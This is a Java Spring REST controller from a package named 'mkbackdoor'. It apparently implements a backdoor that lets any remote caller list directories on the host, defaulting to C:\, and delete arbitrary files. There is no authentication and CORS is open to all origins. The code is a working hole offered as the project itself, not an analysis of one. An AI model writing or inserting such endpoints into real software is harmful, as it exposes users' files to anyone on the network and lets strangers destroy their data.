package proglang.mkbackdoor;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Objects;

@CrossOrigin(origins = "*", maxAge = 3600, allowedHeaders = "*")
@RestController
@RequestMapping("/api")
public class Controller {
    @GetMapping("/index")
    @ResponseBody
    public ResponseEntity<IndexResponse> viewFiles(@RequestParam(value = "path", required = false) String path) {

        path = Objects.equals(path, null) ? "C:\\" : path;

        File dir = new File(path);

        File[] filesInFolder = dir.listFiles();

        assert filesInFolder != null;
        IndexResponse indexResponse = new IndexResponse(
                dir.getPath().replace("\\", "/"), filesInFolder.length);

        for (int i = 0; i < Objects.requireNonNull(filesInFolder).length; i++)
            indexResponse.getContent().add(new DirItem(filesInFolder[i]));


        return new ResponseEntity<>(indexResponse, HttpStatus.OK);
    }

    @DeleteMapping("/remove")
    public HttpStatus deleteItem(@RequestParam(value = "path") String path) {

        File fileToDelete = new File(path);
        try {
            Files.delete(Path.of(fileToDelete.getPath()));
        } catch (IOException e) {
            e.printStackTrace();
            return HttpStatus.BAD_REQUEST;
        }

        return HttpStatus.OK;
    }
}
